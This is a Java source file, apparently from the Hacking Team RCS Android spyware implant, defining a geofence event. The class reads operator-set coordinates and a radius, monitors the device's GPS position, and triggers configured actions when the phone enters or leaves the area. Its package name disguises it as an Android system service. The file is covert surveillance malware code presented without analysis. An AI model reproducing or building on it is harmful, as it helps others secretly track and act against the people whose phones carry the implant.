/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : EventLocation.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.util.Log;

import com.android.service.agent.position.GPSLocator;
import com.android.service.agent.position.GPSLocatorDistance;
import com.android.service.agent.position.RangeObserver;
import com.android.service.conf.Configuration;
import com.android.service.util.DataBuffer;

public class EventLocation extends EventBase implements RangeObserver {

	private static final String TAG = "EventLocation";
	int actionOnEnter;
	int actionOnExit;

	int distance;
	float latitudeOrig;
	float longitudeOrig;
	GPSLocator locator;

	@Override
	public void begin() {
		locator = new GPSLocatorDistance(this, latitudeOrig, longitudeOrig, distance);
		locator.start();
	}

	@Override
	public void end() {
		locator.halt();
		try {
			locator.join();
		} catch (InterruptedException e) {
			
			if(Configuration.DEBUG) { e.printStackTrace(); }
		}
		locator = null;
	}

	@Override
	public boolean parse(EventConf eventConf) {
		byte[] confParams = eventConf.getParams();
		final DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length);

		try {
			actionOnEnter = eventConf.getAction();
			actionOnExit = databuffer.readInt();

			distance = databuffer.readInt();

			latitudeOrig = (float) databuffer.readDouble();
			longitudeOrig = (float) databuffer.readDouble();
			
			
			Log.d("QZ", TAG + " Lat: " + latitudeOrig + " Lon: " + longitudeOrig
					+ " Dist: " + distance);
		}catch(IOException ex){
			return false;
		}

		return true;
	}

	@Override
	public void go() {
	}


	public int notification(Boolean onEnter) {
		if (onEnter) {
			trigger(actionOnEnter);
		} else {
			trigger(actionOnExit);
		}
		
		return 0;
	}

}
